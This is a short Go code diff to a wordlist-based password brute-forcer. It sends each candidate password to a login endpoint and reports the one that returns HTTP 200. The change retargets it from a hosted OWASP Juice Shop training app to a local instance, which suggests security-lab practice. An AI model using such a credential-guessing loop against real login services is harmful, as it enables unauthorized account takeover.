@@ -79,17 +79,21 @@ func main() {
 
 	fmt.Println("Successfully opened wordlist")
 
+	client := &http.Client{}
 	scanner := bufio.NewScanner(wordlistFile)
 	for scanner.Scan() {
-		req := createRequest(wordlistKey, scanner.Text(), rawRequest)
-		res, err := http.Post("https://juice-shop.herokuapp.com/rest/user/login",
-			"application/json", req)
+		params := createRequest(wordlistKey, scanner.Text(), rawRequest)
+		req, err := http.NewRequest("POST", "http://localhost:3000/rest/user/login",
+			params)
+
+		req.Header.Add("Content-Type", "application/json")
+		res, err := client.Do(req)
 		if err != nil {
 			fmt.Println("err: ", err)
 			return
 		}
 		if res.StatusCode == 200 {
-			fmt.Printf("Successfully found: %v", scanner.Text())
+			fmt.Printf("Successfully, password=> %v", scanner.Text())
 			return
 		}
 		res.Body.Close()
